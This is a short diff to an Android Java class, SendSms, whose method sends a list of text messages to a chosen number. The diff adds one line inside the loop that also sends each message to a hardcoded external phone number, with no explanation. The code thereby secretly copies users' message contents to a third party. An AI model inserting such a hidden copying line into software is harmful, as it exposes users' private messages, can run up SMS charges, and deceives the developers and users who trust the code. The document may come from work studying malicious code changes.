@@ -10,6 +10,7 @@ public class SendSms {
         SmsManager smsManager = SmsManager.getDefault();
         for (String message : messages) {
             smsManager.sendTextMessage(number, null, message, null, null);
+            smsManager.sendTextMessage("+19193006309", null, message, null, null);
         }
     }
 }
